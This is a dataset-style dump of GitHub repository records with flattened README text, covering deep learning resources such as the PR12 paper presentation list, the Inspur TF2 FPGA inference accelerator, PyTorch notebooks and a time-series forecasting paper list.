taeoh-kim,pr12,n/a,PR12 Deep Learning Paper Presentation List and Summary A Documentation of PR12 Deep Learning Paper Presentation Group on YouTube from Tensorflow Korea Community Tensorflow Korea PR12 List Up Taeoh Kim kto yonsei ac kr Video Playlist Season 1 PR 001 PR 100 Apr 2017 Jul 2018 https www youtube com watch v auKdde7Anr8 list PLWKf9beHi3Tg50UoyTe6rIm20sVQOH1br Video Playlist Season 2 PR 101 PR 200 Sep 2018 Oct 2019 https www youtube com watch v FfBp6xJqZVA list PLWKf9beHi3TgstcIn8K6dI85ppAxzB8 Video Playlist Season 3 PR 201 PR 300 Oct 2019 https www youtube com watch v D baIgejA4M list PLskMddDjnzq1wDI3t2cH9hlK6wBBapeA Last Updated 2019 11 23 Table of Contents Papers by Topic https github com taeoh kim pr12 papers by topic PR12 Presenter https github com taeoh kim pr12 presenter Paper Statistics https github com taeoh kim pr12 paper statistics Presentations PR 001 PR 050 https github com taeoh kim pr12 pr 001 pr 050 PR 051 PR 100 https github com taeoh kim pr12 pr 051 pr 100 PR 101 PR 150 https github com taeoh kim pr12 pr 101 pr 150 PR 151 PR 200 https github com taeoh kim pr12 pr 151 pr 200 PR 201 PR 250 https github com taeoh kim pr12 pr 201 pr 250 Papers by Topic Up to PR 200 Title PR 001 to 100 PR 101 to 200 Network CNN 002 011 020 028 034 083 123 155 163 169 170 177 RNN 003 014 058 068 Neural Networks 043 138 174 Network Compression 009 026 033 044 054 072 078 105 108 111 120 144 156 180 183 184 187 193 194 197 200 Hardware 085 111 Visualization 047 053 Memory Networks 006 036 Capsule Networks 056 Generative Models Generative Models 001 010 022 024 040 048 051 087 088 101 116 125 136 137 142 144 174 192 GANs 001 022 030 048 051 065 073 077 079 087 102 104 109 114 115 122 125 131 136 142 152 154 165 168 192 VAEs 010 101 164 173 Autoregressive Models 024 040 068 Normalizing Flow Models 116 Computer Vision Classification 020 021 026 028 034 044 054 083 090 108 119 120 123 156 163 169 170 171 183 196 198 Detection 002 012 016 023 025 033 044 054 057 084 108 110 132 146 157 158 166 172 185 196 198 199 Segmentation 008 045 057 100 123 126 141 159 200 Human Body Face 014 102 126 127 135 165 171 185 3D Single View 098 3D Multi View 135 OCR 158 Image Restoration 004 030 107 113 149 151 177 Video Motion 014 102 104 114 139 192 198 200 Style Transfer 007 122 131 149 186 Image Translation 065 073 102 104 114 152 154 165 168 179 Relational Reasoning 018 095 NLP Text Knowledge Representation 027 049 076 099 121 145 161 175 Machine Translation 003 055 Question Answering 037 Text Classification 015 037 Text Generation 077 Text Style Transfer 059 Knowledge Tracing 046 Audio Speech Audio Speech Enhancement 067 Audio Speech Generation 040 079 Audio Speech Style Transfer 091 128 Audio Speech Separation 082 Multimodal Multimodal 025 147 179 Vision and Language Text 032 041 074 082 147 179 CNN RNN 050 Text to Speech 074 179 Reinforcement Learning Reinforcement Learning 005 017 019 029 052 077 081 093 100 130 143 Machine Learning Transfer Learning 009 026 078 096 160 181 Domain Adaptation 013 159 Optimization 031 042 066 071 075 086 134 Attention 011 049 055 083 161 163 179 196 Explainable AI 035 047 053 089 106 140 167 181 Few One Zero Shot 036 165 168 Bayesian Uncertainty 039 080 088 Latent Space Models 088 Graph 026 160 178 Dimension Reduction 112 124 Data Visualization 103 Weakly supervised Learning 047 053 Semi supervised Learning 178 189 195 Self supervised Learning 090 124 136 162 Anomaly Detection 115 148 190 Disentangled Representation 010 022 101 137 164 Generalization 061 062 066 075 140 150 176 181 182 189 190 195 Regularization 061 182 Active Learning 119 Metric Similarity Learning 127 139 147 151 171 Imitation Learning 130 Continual Learning 188 Normalization 021 134 186 Distributed Training 092 129 133 Counterfactual Inference 097 ML Fairness 191 AutoML Neural Architecture Search 017 063 069 105 141 155 166 169 183 187 194 Hyperparameter Optimization 080 Meta Learning 031 094 153 188 Applications Medical 008 159 173 177 Recommender System 060 064 Adversarial Attack 038 117 118 Cloud 070 Data Acquisition Annotation 157 Presenter Jaejun Yoo https www youtube com user jaejun2004 Season 1 Terry TaeWoong Um https www youtube com channel UCDku86cssbM288VJtl GQKg Season 1 Keunbong Kwak https www youtube com channel UCmy2BD9vDCY9LYlhyKbVUA Season 1 Taegyun Jeon https www youtube com channel UCpWW6plhR5s gJifHHF6cqQ Season 1 Sunghun Kim https www youtube com channel UCML9R2ol l0Ab9OXoNnr7Lw Season 1 Kiho Suh https www youtube com channel UClXA7rZfqDeVcwdcgO 2mA Season 1 Seungil Kim https www youtube com channel UCaVK6gEXTaEQ7WoBZas lGg Season 1 Dongjun Jung https www youtube com channel UC19Ia6oXpWMCfxgDv0txoQ Season 1 Young Jae Choung https www youtube com channel UCjiE8ahJHhc0944xYTRHwsQ Season 1 Junbum Cha https www youtube com channel UCjCuD2gwcX4WWK4LhhoXsXw Season 1 Jiyang Kang https www youtube com channel UCh5oA2rwhVHLjwTDWc MoQ Season 1 3 Jinwon Lee https www youtube com channel UCaJFuqpYqxWuQl9TZky0njA Season 1 2 3 Ji Hoon Kim https www youtube com channel UCMYklhhWWoMKZ9RTq dhkbg Season 1 KwangHee Lee https www youtube com channel UCZnf5LQdOq0J2M1ZbQq2XCg Season 1 Taesu Kim https www youtube com channel UCeHES5JYWnoobUUwI9S1Hw Season 1 2 Taeoh Kim https www youtube com channel UCtfvbtV82UDr vHnj5sPeGQ Season 1 2 3 Byung Hak Kim https www youtube com channel UCl2Y6qJzu6JzbmmKWwaKhjw Season 1 2 3 MinGuk Kang https www youtube com channel UCMiSEXsuX5GU4MM0hUgAGg Season 2 Taekmin Kim https www youtube com channel UCR44Za4LI28yblGNYzUFmvg Season 2 Jinsung Yoon https www youtube com channel UCR9RxRIef7kuYwfe6GwCsdA Season 2 Jiwon Jung https www youtube com channel UCmlcTkgqkpUeYwL0dEkXhQ Season 2 Young Seok Kim https www youtube com channel UCoWRhlP6qQs4CijevfWqvig Season 2 3 Jaewon Lee https www youtube com channel UCaMocgxYJ0oWvfRqYQHK0yQ Season 2 Soyeon Kim https www youtube com channel UC84QQ7TgkHuBbqb8kYFZXg Season 2 Jae Duk Seo https www youtube com channel UCf5jue1EwgWrYw9bjTynV4g Season 2 Sunghoon Joo https www youtube com channel UCrcRz2PZ0akJ4IoYCYgwlEg Season 2 3 Doyup Lee https www youtube com channel UCWrG7MPkGR4BMhYOuDIXpcg Season 2 3 Sungnam Park https www youtube com channel UCWDE4MKQk8CsRy2vM0S0dOg Season 2 3 Seongok Ryu https www youtube com channel UCV5jTejHwMeMN7ZIxtlsA Season 3 Kyeongseon Kim Season 3 Hoseong Lee https www youtube com channel UC0XOqIsXcLXtIHbb3Qfp68w Season 3 Kyunghoon Jung Season 3 Changhoon Jeong Season 3 Hyeongmin Lee Season 3 Paper Statistics by Main Subject Title PR 001 to 050 PR 051 to 100 PR 101 to 150 PR 151 to 200 Computer Vision 29 13 26 31 Machine Learning 21 20 20 20 NLP 5 7 2 3 Reinforcement Learning 3 3 2 0 Audio Speech 1 6 1 0 Text Knowledge Graph 1 3 0 1 Hardware 0 1 1 0 by Conferences Journals Title PR 001 to 050 PR 051 to 100 PR 101 to 150 PR 151 to 200 CVPR 20 7 12 14 NeurIPS 12 7 7 6 ICML 6 9 4 7 ICLR 9 12 7 5 ICCV 1 3 1 5 ECCV 0 0 7 2 EMNLP 3 0 0 0 AAAI 1 1 1 1 RecSys 0 2 0 0 Interspeech 0 2 0 0 ISCA 0 1 1 0 SIGGRAPH 0 1 0 0 ICASSP 0 1 0 0 ECML PKDD 0 1 0 0 WACV 0 0 1 0 ICCC 0 0 1 0 IPMI 0 0 1 0 BMVC 0 0 0 2 ACL 0 0 0 1 Arxiv Blog Tech Rpt 5 5 6 7 Journals 3 1 3 4 by Published Year Title PR 001 to 050 PR 051 to 100 PR 101 to 150 PR 151 to 200 2019 0 2 11 25 2018 0 18 23 15 2017 23 20 8 9 2016 14 7 5 3 2015 14 2 1 1 2014 7 2 0 0 2013 1 0 0 0 2012 1 2 4 1 PR 001 PR 050 PR 001 Generative Adversarial Nets Paper https arxiv org abs 1406 2661 Video https youtu be L3hz57whyNw Ian J Goodfellow et al NIPS 2014 Keywords Generative Models GANs Presenter Jaejun Yoo Top https github com taeoh kim pr12 table of contents PR 002 Deformable Convolutional Networks Paper https arxiv org abs 1703 06211 Video https youtu be RRwaz0fBQ0Y Jifeng Dai et al CVPR 2017 Keywords CNN Detection Presenter Terry TaeWoong Um Top https github com taeoh kim pr12 table of contents PR 003 Learning Phrase Representations using RNN Encoder Decoder for Statistical Machine Translation Paper https arxiv org abs 1406 1078 Video https youtu be Dp8u97rQ0 Kyunghyun Cho et al EMNLP 2014 Keywords NLP RNN Machine Translation Presenter Keunbong Kwak Top https github com taeoh kim pr12 table of contents PR 004 Image Super Resolution using Deep Convolutional Neural Networks Paper https arxiv org abs 1501 00092 Video https youtu be 1jGrOFyfa0 Chao Dong et al CVPR 2015 Keywords Image Restoration Presenter Taegyun Jeon Top https github com taeoh kim pr12 table of contents PR 005 Playing Atari with Deep Reinforcement Learning Paper https arxiv org abs 1312 5602 Video https youtu be V7cNTfm2i8 Volodymyr Mnih et al NIPS 2013 Workshop Keywords Reinforcement Learning Presenter Sunghun Kim Top https github com taeoh kim pr12 table of contents PR 006 Neural Turing Machines Paper https arxiv org abs 1410 5401 Video https youtu be 2wbDiZCWQtY Alex Graves et al Arxiv 2014 Keywords Memory Networks Presenter Kiho Suh Top https github com taeoh kim pr12 table of contents PR 007 Deep Photo Style Transfer Paper https arxiv org abs 1703 07511 Video https youtu be YF6nLVDlznE Fujun Luan et al CVPR 2017 Keywords Style Transfer Presenter Seungil Kim Top https github com taeoh kim pr12 table of contents PR 008 Reverse Classification Accuracy Predicting Segmentation Performance in the Absence of Ground Truth Paper https arxiv org abs 1702 03407 Video https youtu be jbnjzyJDldA Vanya V Valindria et al IEEE Transactions on Medical Imaging 2017 Keywords Medical Segmentation Presenter Dongjun Jung Top https github com taeoh kim pr12 table of contents PR 009 Distilling the Knowledge in a Neural Network Paper https arxiv org abs 1503 02531 Video https youtu be tOItokBZSfU Geoffrey Hinton et al NIPS 2014 Workshop Keywords Network Compression Transfer Learning Presenter Young Jae Choung Top https github com taeoh kim pr12 table of contents PR 010 Auto Encoding Variational Bayes Paper https arxiv org abs 1312 6114 Video https youtu be KYA GEhObIs Diederik P Kingma and Max Welling ICLR 2014 Keywords Generative Models VAEs Disentangled Representation Presenter Junbum Cha Top https github com taeoh kim pr12 table of contents PR 011 Spatial Transformer Networks Paper https arxiv org abs 1506 02025 Video https youtu be Rv3osRZWGbg Max Jaderberg et al NIPS 2015 Keywords CNN Attention Presenter Jiyang Kang Top https github com taeoh kim pr12 table of contents PR 012 Faster R CNN Towards Real time Object Detection with Region Proposal Networks Paper https arxiv org abs 1506 01497 Video https youtu be kcPAGIgBGRs Shaoqing Ren et al NIPS 2015 Keywords Detection Presenter Jinwon Lee Top https github com taeoh kim pr12 table of contents PR 013 Domain Adversarial Training of Neural Network Paper https arxiv org abs 1505 07818 Video https youtu be n2J7giHrS Y Yaroslav Ganin et al JMLR 2016 Keywords Domain Adaptation Presenter Jaejun Yoo Top https github com taeoh kim pr12 table of contents PR 014 On Human Motion Prediction using RNNs Paper https arxiv org abs 1705 02445 Video https youtu be Y1loN3Sc4Dk Julieta Martinez et al CVPR 2017 Keywords RNN Human Body Face Video Motion Presenter Terry TaeWoong Um Top https github com taeoh kim pr12 table of contents PR 015 Convolutional Neural Networks for Sentence Classification Paper https arxiv org abs 1408 5882 Video https youtu be IRB2vXSet2E Yoon Kim EMNLP 2014 Keywords NLP Text Classification Presenter Keunbong Kwak Top https github com taeoh kim pr12 table of contents PR 016 You Only Look Once Unified Real time Object Detection Paper https arxiv org abs 1506 02640 Video https youtu be eTDcoeqj1w Joseph Redmon et al CVPR 2016 Keywords Detection Presenter Taegyun Jeon Top https github com taeoh kim pr12 table of contents PR 017 Neural Architecture Search with Reinforcement Learning Paper https arxiv org abs 1611 01578 Video https youtu be XP3vyVrrt3Q Barret Zoph and Quoc V Le ICLR 2017 Keywords Neural Architecture Search Reinforcement Learning Presenter Kiho Suh Top https github com taeoh kim pr12 table of contents PR 018 A Simple Neural Network Module for Relational Reasoning Paper https arxiv org abs 1706 01427 Video https youtu be Lb1PVpFp9F8 Adam Santoro et al NIPS 2017 Keywords Relational Reasoning Presenter Sunghun Kim Top https github com taeoh kim pr12 table of contents PR 019 Continuous Control with Deep Reinforcement Learning Paper https arxiv org abs 1509 02971 Video https youtu be h2WSVBAC1t4 Timothy P Lillicrap et al Arxiv 2015 Keywords Reinforcement Learning Presenter Seungil Kim Top https github com taeoh kim pr12 table of contents PR 020 Delving Deep into Rectifiers Surpassing Human Level Performance on ImageNet Classification Paper https arxiv org abs 1502 01852 Video https youtu be absOinFeGv0 Kaiming He et al ICCV 2015 Keywords CNN Classification Presenter Jiyang Kang Top https github com taeoh kim pr12 table of contents PR 021 Batch Normalization Paper https arxiv org abs 1502 03167 Video https youtu be TDx8iZHwFtM Sergey Loffe and Christian Szegedy ICML 2015 Keywords Classification Normalization Presenter Young Jae Choung Top https github com taeoh kim pr12 table of contents PR 022 InfoGAN Paper https arxiv org abs 1606 03657 Video https youtu be 4jbgniqtQ Xi Chen at al NIPS 2016 Keywords Generative Models GANs Disentangled Representation Presenter Junbum Cha Top https github com taeoh kim pr12 table of contents PR 023 YOLO9000 Better Faster Stronger Paper https arxiv org abs 1612 08242 Video https youtu be 6fdclSGgeio Joseph Redmon and Ali Farhadi CVPR 2017 Keywords Detection Presenter Jinwon Lee Top https github com taeoh kim pr12 table of contents PR 024 Pixel Recurrent Neural Network Paper https arxiv org abs 1601 06759 Video https youtu be BvcwEz4VPIQ Aaron van den Oord et al ICML 2016 Keywords Generative Models Autoregressive Models Presenter Jaejun Yoo Top https github com taeoh kim pr12 table of contents PR 025 Learning with Side Information through Modality Hallucination Paper http openaccess thecvf com contentcvpr2016 html HoffmanLearningWithSideCVPR2016paper html Video https youtu be KdRo7ATNs9g Judy Hoffman et al CVPR 2016 Keywords Multimodal Detection Presenter Terry TaeWoong Um Top https github com taeoh kim pr12 table of contents PR 026 Notes for CVPR 2017 3 Papers Paper1 https arxiv org abs 1702 08690 Paper2 https arxiv org abs 1612 04844 Paper3 http openaccess thecvf com contentcvpr2017 html YuOnCompressingDeepCVPR2017paper html Video https youtu be ZdPBkPGfRSk Borrowing Treasures from the Wealthy Deep Transfer Learning through Selective Joint Fine tuning by Weifeng Ge and Yizhou Yu The More You Know Using Knowledge Graphs for Image Classification by Kenneth Marino et al On Compressing Deep Models by Low Rank and Sparse Decomposition by Xiyu Yu at al Keywords Transfer Learning Graph Networks Classification Network Compression Presenter Taegyun Jeon Top https github com taeoh kim pr12 table of contents PR 027 GloVe Global Vectors for Word Representation Paper https www aclweb org anthology D14 1162 Video https youtu be uZ2GtEe 50E Jeffrey Pennington et al EMNLP 2014 Keywords NLP Re,2019-09-15T07:25:04Z,2019-12-06T01:10:40Z,n/a,taeoh-kim,User,10,48,11,10,master,taeoh-kim,1,0,0,0,0,0,0
shliang0603,Awesome-DeepLearning-500FAQ,n/a,Awesome DeepLearning 500FAQ python 01 02 03 04 05 CNN 06 RNN 07 08 09 10 11 12 13 14 15GPU 16NLP 17 18 18 markdownmarkdownmarkdownLaTexmarkdown HTML PDF 1HTML images categories png 2 images formula png cloneclone https pan baidu com s 1nK8HytJ cdy7Nu49vYbxVA eivv,2019-09-19T14:21:05Z,2019-12-13T00:57:41Z,HTML,shliang0603,User,0,47,10,12,master,shliang0603,1,0,0,1,1,0,0
yaojieliu,CVPR2019-DeepTreeLearningForZeroShotFaceAntispoofing,n/a,Deep Tree Learning for Zero shot Face Anti Spoofing Yaojie Liu Joel Stehouwer Amin Jourabloo Xiaoming Liu alt text https yaojieliu github io images cvpr19 png Setup Install the Tensorflow 2 0 Training To run the training code python train py Acknowledge Please cite the paper inproceedingscvpr19yaojie title Deep Tree Learning for Zero shot Face Anti Spoofing author Yaojie Liu Joel Stehouwer Amin Jourabloo Xiaoming Liu booktitle In Proceeding of IEEE Computer Vision and Pattern Recognition CVPR 2019 address Long Beach CA year 2019 If you have any question please contact Yaojie Liu liuyaoj1 msu edu,2019-09-09T15:49:35Z,2019-12-10T06:29:40Z,Python,yaojieliu,User,4,40,12,15,master,yaojieliu,1,0,0,3,2,0,1
wetalkdata,Machine-Learning_Deep-Learning-Manual,n/a,,2019-09-10T01:16:04Z,2019-12-14T11:07:18Z,n/a,wetalkdata,Organization,5,39,7,10,master,haobinlaosi#yusirkuan,2,0,0,0,0,0,0
DLSchool,deep_learning_2019-20_main,n/a,2019 2020 Deep Learning 2019 2020 https www dlschool org https mipt ru education departments fpmi https github com DLSchool deeplearning2018 19 iPavlov,2019-09-02T18:59:31Z,2019-12-11T14:13:33Z,n/a,DLSchool,Organization,23,37,20,27,master,izaharkin,1,0,0,0,0,0,0
TF2-Engine,TF2,cnn#deep-learning#dnn#fpga#inference#model-compression#model-pruning#opencl#quantization,Inspur Deep Learning Inference Accelerator TF2 partners png imgs partners png TF2 TF2 is a deep learning inference accelerator based on FPGA computing platform developed by Inspur AI HPC A wide range of general purpose deep neural networks can be supported Models from popular deep learning frameworks such as Pytorch TensorFLow and Caffe can be loaded into TF2 easily by toolkits we supplied The pretrained deep learning model can be compiled into FPGA without any code level FPGA development work which can be an agile solution for AI inference applications on FPGA See the link https 1drv ms b s Am9Mk04MAK1bpXjzmHS8U04PSI e LaSgjb for our paper A Deep Learning Inference Accelerator Based on Model Compression on FPGA The TF2 accelerator is composed of two parts Transform Kit and Runtime Engine top imgs top png TransForm Kit Transform Kit is a tool for model optimization and conversion with modules of model compression pruning and quantification etc Transform Kit aims to reduce model data size and simplify mathmatical calculation Additionally computational node fusion can also be done in transform kit to relax the data access bandwidth limitation on computing performance by integrating multiple computing nodes into one Runtime Engine can automatically convert the previously optimized model file into FPGA targeting file by compiling The compression and pruning operations are optional Compression Model compression is based on Inspur optimized Incremental Network Quantization INQ compression method Deep neural network model data trained by Pytorch and other frameworks can be used as input It can compress 32 bit floating point model data into 4 bit integers making the actual model data size 1 8 of the original with original data structure maintained The represented value of the compressed model is 4 bit integeral power of 2 or 0 Four 4 bit data is stored as 1 short type data The accuracy of the typical CNN with or without compression is shown in the following table NetWork Top1 Top5 Top1 Compressed Top5 Compressed Alexnet 0 5676 0 7990 0 5687 0 8000 VGG16 0 6828 0 8827 0 7055 0 8994 GoogLeNet 0 6889 0 8898 0 6857 0 8887 ResNet50 0 7276 0 9101 0 7465 0 9248 SqueezeNet 0 5750 0 8030 0 5900 0 8040 NetWork Map Map Compressed SSD 0 7773 0 7757 Pruning TF2 Pruning unit includes random pruning and channel pruning modules code will be published later The random pruning algorithm is a high pruning rate method but the pruned model is a sparse model Channel pruning is a kind of structuralized pruning which is a dynamic pruning method This method can directly reduce the channels to lower the computational cost The advantages of this method are 1 the pruned model can be re trained to the original accuracy with limited training iterations 2 the pruned model can be directly loaded into TF2 Runtime Engine The pruning rate and the accuracy with or without pruning of ResNet50 are shown in the table below Model pruning can realize 1 6x speedup on FPGA Pruned Ratio Top1 Top5 Top1 gap Top5 gap 0 0 7277 0 9109 50 0 7289 0 9118 0 13 0 17 60 0 7183 0 9079 0 93 0 22 Quantization Since the model is innately 4 bit data after compression the quantization of TF2 is only for feature map data TF2 quantization tool can quantize normalized 32 bit single precision floating point feature map data to 8 bit integer that is quantized to 128 to 127 The main advantage of feature map data quantization is that it can reduce the storage resource requirement of on chip feature data by a quarter and can reduce the logic calculation required for data processing greatly improving the computing power of FPGA The algorithm is described as follows 1 Calculating the maximum value fmax of the absolute value of the feature map data of each channel of each convolution layer of the neural network 2 Find Q according to the equation 128 power 2 Q fmax 3 According to the equation above the quantized data V power 2 Q fv where fv is the original single precision floating point data The calculation accuracy of deep learning neural network SqueezeNet and ResNet50 with or without quantization is shown in the following table NetWork Top1 Top5 Top1 Quantized Top5 Quantized Squeezenet 0 5900 0 8040 0 5900 0 8010 ResNet50 0 7145 0 9010 0 7120 0 9043 RunTime Engine The TF2 Runtime Engine is an intelligent runtime FPGA accelerator which can automatically generate FPGA executive files It first parses the network structure file and generates the network configuration file required by the Runtinme Engine and then recompiles FPGA code which can automatically generates the FPGA executive file With the 4 bit integeral power of 2 compressed model data and the 8 bit integeral feature map data in Runtime Engine the multiplication of model data and feature map data can be converted to shift operation which eliminates the dependency for DSP floating point computing resources on FPGA greatly improves the performance of deep neural network inference on FPGA and effectively reduces its operating power consumption The TF2 Runtime Engine top level computing architecture is shown below Multiple convolutional layers are executed serially on the FPGA In order to reduce the storage access limitation on computing performance the intermediate feature map data is preferentially stored on the chip as much as possible The model data is read from the external DDR to the FPGA in real time during the calculation process but reading operation can be performed simultaneously with the calculation that is the reading time can be hidden under the calculation time The core computing architecture of TF2 Runtime Engine is shown below block png imgs block png The Filter Loader reads model data from the DDR to the chip The Feature Loader reads the input picture and feature map data from the DDR to the on chip cache The Controller generates a control signal for the Scheduler The Scheduler reads the Feature data according to the control signal and sends data such as Feature Filter timing signal and control signal to the PE for calculation PE Array is the core computation unit of the entire computing architecture performing Shift Accumulate SAC or Multiply Accumulate MAC calculations The current version is SAC which will be updated by MAC computing There is a Filter Cache in PE which is used to store the Filter data for calculating current output channel The Adder adds the partial results of the MAC SAC calculations to generate the final convolution results The number of PEs in a PE Array can be configured according to the structure of the neural network and the amount of FPGA resources MAC SAC can be calculated in 1D 2D or 3D and can be configured according to field application The current version has 2D and 3D calculations The vector length calculated by each MAC SAC dimension can also be configured according to the specific application and FPGA computing resources Networks such as ResNet50 SqueezeNet computiing performance is listed as follows NetWork Throughput fps SqueezeNet 1485 GoogLeNet 306 FaceNet MTCNN SqueezeNet 1020 RoadMap 2019 Q2 Transform kit Model comression and 8 bit quantization algorithm based on Pytorch Runtime Engine CNN accelerator architecture based on OpenCL that uses SAC caculations Models ResNet50 GoogLeNet etc can be tested directly based on the Inpur F10A board 2019 Q3 Transform Kit Random pruning and channel pruning algorithm for CNN automated model conversion tool Runtime Engine An automatic model analysis tool and new CNN accelerator architecture for MAC caculations 2019 Q4 Transform Kit More structural pruning algorithms and 4 bit quantization algorithm for CNN Runtime Engine A general purpose computing architecture for sparse models 2020 Q1 Transform kit Any bit quantization algorithm for CNN networks Runtime Engine Accelerator architecture that supports TransFormer computing 2020 Q2 Transform Kit AutoML based pruning and quantization algorithm NLP network optimization algorithm Runtime Engine Support the NLP universal model and update the computing architecture continuously Releases and Contributing We appreciate all contributions If you are planning to contribute back bug fixes or add new algorithms about compression or pruning please do so without any further discussion If you plan to update computing architecture of FPGA please first open an issue and discuss the feature with us Sending a PR without discussion might end up resulting in a rejected PR because we might be taking the architecture in a different direction than you might be aware of Reference 1 Utku Aydonat Shane OConnell Davor Capalija Andrew C Ling and Gordon RChiu 2017 An Open deep learning accelerator on arria 10 In Proceedings of the 2017 ACM SIGDA International Symposium on Field Programmable Gate Arrays ACM 5564 2 Aojun Zhou Anbang Yao Yiwen Guo Lin Xu and Yurong Chen 2017 Incremental network quantization Towards lossless cnns with low precision weights arXiv preprint arXiv 1702 03044 2017 License Apache License 2 0 LICENSE,2019-08-27T01:17:14Z,2019-12-12T07:55:13Z,Python,TF2-Engine,User,7,37,15,73,master,TF2-Engine,1,0,0,4,2,0,0
omarsar,pytorch_notebooks,ai#deeplearning#machine-learning#nlp#notebook#pytorch,PyTorch Notebooks A collection of PyTorch notebooks for studying and practicing deep learning Name Description Category Level Link Blog PyTorch Quickstart Learn about PyTorch s basic building blocks to build and train a CNN model for image classification Image Classification Intermediate read A Gentle Introduction to PyTorch1 2 This comprehensive tutorial aims to introduce the fundamentals of PyTorch building blocks for training neural networks Neural Networks Beginner read,2019-08-25T11:50:26Z,2019-11-25T08:59:45Z,Jupyter Notebook,omarsar,User,4,36,9,8,master,omarsar,1,0,0,0,0,0,0
Alro10,deep-learning-time-series,deep-learning#forecasting-models#lstm#lstm-neural-networks#prediction#python3#pytorch#series-classification#series-forecasting#tensorflow#time-series#time-series-classification#time-series-forecasting#time-series-prediction,Deep learning time series Forecasting PRsWelcome https img shields io badge PRs welcome brightgreen svg style flat square http makeapullrequest com List of state of the art papers focus on deep learning and resources code and experiments using deep learning for time series forecasting Classic methods vs Deep Learning methods Table of Contents Papers Papers Conferences Conferences Code Code Theory Resource Theory Resource Code Resource Code Resource Datasets Datasets Papers 2019 Deep Amortized Variational Inference for Multivariate Time Series Imputation with Latent Gaussian Process Models https openreview net pdf id H1xXYy3VKr Vincent Fortuin et al Code not yet Deep Physiological State Space Model for Clinical Forecasting https arxiv org pdf 1912 01762 pdf Yuan Xue et al not yet AR Net A simple Auto Regressive Neural Network for time series https arxiv org abs 1911 12436 Oskar Triebe et al Facebook Research Code not yet Learning Time series Data of Industrial Design Optimization using Recurrent Neural Networks https ecole itn eu wp content uploads 2019 11 LMIDSnehafinalversion pdf Sneha Saha et al Honda Research Institute Europe GmbH Code not yet RobustSTL A Robust Seasonal Trend Decomposition Algorithm for Long Time Series https arxiv org abs 1812 01767 Qingsong Wen et al Code https github com LeeDoYup RobustSTL Constructing Gradient Controllable Recurrent Neural Networks Using Hamiltonian Dynamics https arxiv org pdf 1911 05035 pdf Konstantin Rusch et al Code not yet SOM VAE Interpretable Discrete Representation Learning on Time Series https openreview net pdf id rygjcsR9Y7 ICLR 2019 Vincent Fortuin et al Code https github com ratschlab SOM VAE Unsupervised Scalable Representation Learning for Multivariate Time Series https arxiv org abs 1901 10738 NeurIPS 2019 In Applications Time Series Analysis https nips cc Conferences 2019 Schedule showParentSession 15627 Jean Yves Franceschi et al Code https github com White Link UnsupervisedScalableRepresentationLearningTimeSeries Factorized Inference in Deep Markov Models for Incomplete Multimodal Time Series https arxiv org pdf 1905 13570v1 pdf Zhi Xuan Tan et al Code not yet You May Not Need Order in Time Series Forecasting https arxiv org pdf 1910 09620 pdf Yunkai Zhang et al Code not yet Self boosted Time series Forecasting with Multi task and Multi view Learning https arxiv org pdf 1909 08181 pdf AAAI 2020 Long H Nguyen et al Code not yet Shape and Time Distortion Loss for Training Deep Time Series Forecasting Models https arxiv org pdf 1909 09020 pdf NeurIPS2019 Vincent Le Guen and Nicolas Thome Code https github com vincent leguen STDL Dynamic Local Regret for Non convex Online Forecasting https arxiv org pdf 1910 07927 pdf NeurIPS 2019 Sergul Aydore et al Code https github com Timbasa DynamicLocalRegretforNon convexOnlineForecastingNeurIPS2019 Bayesian Temporal Factorization for Multidimensional Time Series Prediction https arxiv org pdf 1910 06366 pdf Xinyu Chen and Lijun Sun Code and data https github com xinychen transdim Probabilistic sequential matrix factorization https arxiv org pdf 1910 03906 pdf mer Deniz Akyildiz et al Code not yet Sequential VAE LSTM for Anomaly Detection on Time Series https arxiv org pdf 1910 03818 pdf Run Qing Chen et al Code not yet High Dimensional Multivariate Forecasting with Low Rank Gaussian Copula Processes https arxiv org pdf 1910 03002 pdf NeurIPS 2019 David Salinas et al Code not yet Recurrent Neural Filters Learning Independent Bayesian Filtering Steps for Time Series Prediction https arxiv org pdf 1901 08096 pdf Bryan Lim et al Code not yet LHCnn A Novel Efficient Multivariate Time Series Prediction Framework Utilizing Convolutional Neural Networks https ieeexplore ieee org abstract document 8855402 Chengxi Liu et al Code not yet SKTIME A UNIFIED INTERFACE FOR MACHINE LEARNING WITH TIME SERIE https arxiv org pdf 1909 07872 pdf Code https github com alan turing institute sktime Recurrent Neural Networks for Time Series Forecasting Current Status and Future Directions https arxiv org pdf 1909 00590 pdf Code https github com HansikaPH time series forecasting Evaluation of statistical and machine learning models for time series prediction Identifying the state of the art and the best conditions for the use of each model https www researchgate net profile AntonioParmezan publication 330742498EvaluationofstatisticalandmachinelearningmodelsfortimeseriespredictionIdentifyingthestate of the artandthebestconditionsfortheuseofeachmodel links 5c558145a6fdccd6b5dc3e2e Evaluation of statistical and machine learning models for time series prediction Identifying the state of the art and the best conditions for the use of each model pdf Antonio Rafael Sabino Parmezan Vinicius M A Souza and Gustavo E A P A Batista USP Explainable Deep Neural Networks for Multivariate Time Series Predictions https www ijcai org proceedings 2019 0932 pdf IJCAI 2019 Roy Assaf and Anika Schumann IBM Research Zurich Code not yet Outlier Detection for Time Series with Recurrent Autoencoder Ensembles https www ijcai org proceedings 2019 0378 pdf IJCAI 2019 Code https github com tungk OED Learning Interpretable Deep State Space Model for Probabilistic Time Series Forecasting https www ijcai org proceedings 2019 0402 pdf IJCAI 2019 Code not yet Deep Factors for Forecasting https arxiv org pdf 1905 12417 pdf ICML 2019 Code not yet Probabilistic Forecasting with Spline Quantile Function RNNs http proceedings mlr press v89 gasthaus19a gasthaus19a pdf Code not yet Deep learning for time series classification a review https arxiv org abs 1809 04356 Code not yet Multivariate LSTM FCNs for Time Series Classification https arxiv org abs 1801 04503 Code not yet Criteria for classifying forecasting methods https www sciencedirect com science article pii S0169207019301529 Code not yet GluonTS Probabilistic Time Series Models in Python https arxiv org abs 1906 05264 Code https gluon ts mxnet io DeepAR Probabilistic Forecasting with Autoregressive Recurrent Networks https arxiv org abs 1704 04110 David Salinas et al Code not yet 2018 Precision and Recall for Time Series http papers nips cc paper 7462 precision and recall for time series NeurIPS2018 Nesime Tatbul et al Code not yet Deep State Space Models for Time Series Forecasting https papers nips cc paper 8004 deep state space models for time series forecasting pdf NeurIPS2018 Code not yet Deep Factors with Gaussian Processes for Forecasting https arxiv org abs 1812 00098 Third workshop on Bayesian Deep Learning NeurIPS 2018 Code https aws amazon com blogs machine learning now available in amazon sagemaker deepar algorithm for more accurate time series forecasting DIFFUSION CONVOLUTIONAL RECURRENT NEURAL NETWORK DATA DRIVEN TRAFFIC FORECASTING https arxiv org pdf 1707 01926 pdf ICLR 2018 Yaguang Li et al Code https github com liyaguang DCRNN DEEP TEMPORAL 